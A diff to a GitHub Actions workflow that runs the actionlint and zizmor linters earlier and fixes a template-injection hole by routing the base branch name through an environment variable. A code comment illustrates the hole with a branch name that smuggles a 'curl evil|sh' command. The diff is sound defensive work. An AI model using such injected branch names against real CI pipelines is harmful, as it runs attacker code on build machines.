@@ -71,6 +71,20 @@ jobs:
           uv tool install zizmor==1.17.0
           uv tool install "rust-just==${JUST_VERSION}"
 
+      # Two readers, because they disagree on purpose. actionlint knows what GitHub will
+      # accept; zizmor knows what an attacker will do with what GitHub accepts.
+      #
+      # Before the gate, not after it, and that ordering is the whole point. These two read
+      # files and need nothing built, so putting them last bought nothing and cost this:
+      # every run where `just check` failed skipped them, so on a branch that had never been
+      # green they had never executed at all. Their first run found two real findings in a
+      # workflow written weeks earlier. A check that only runs once everything else passes
+      # reports on the days it was least needed.
+      - name: workflows are a language too, and the most attacked one
+        run: |
+          actionlint
+          uv tool run zizmor .github/workflows/
+
       - name: the gate, exactly as a developer runs it
         run: just check | tee "$RUNNER_TEMP/check.log"
 
@@ -88,13 +102,6 @@ jobs:
           name: coverage-xml
           path: coverage.xml
           if-no-files-found: error
-
-      # Two readers, because they disagree on purpose. actionlint knows what GitHub will
-      # accept; zizmor knows what an attacker will do with what GitHub accepts.
-      - name: workflows are a language too, and the most attacked one
-        run: |
-          actionlint
-          uv tool run zizmor .github/workflows/
 
       # The day that stopped being true was 2026-08-09: spec 006 declared rich and
       # questionary, and five more arrived behind them. So this step now has something to
@@ -129,12 +136,18 @@ jobs:
       - name: the branch stayed inside the claim it took
         env:
           ITEM: ${{ github.head_ref || github.ref_name }}
+          # A branch name is attacker-supplied text, and a `${{ }}` inside a run block is
+          # pasted into the script before bash ever sees it — so a branch called
+          # `x";curl evil|sh;"` would run. Through the environment it stays one string that
+          # bash quotes. zizmor calls this template-injection and rates it high; it was
+          # right, and it had never run here to say so.
+          BASE_REF: ${{ github.base_ref || 'main' }}
         run: |
           if [ -z "$(git ls-remote origin "refs/ai-eng/claims/$ITEM")" ]; then
             echo "no claim is held for $ITEM: not applicable"
             exit 0
           fi
-          git fetch --no-tags origin "+refs/heads/${{ github.base_ref || 'main' }}:refs/gate/base"
+          git fetch --no-tags origin "+refs/heads/${BASE_REF}:refs/gate/base"
           ai-eng spec checkpoint --base refs/gate/base --item "$ITEM"
 
   suite:
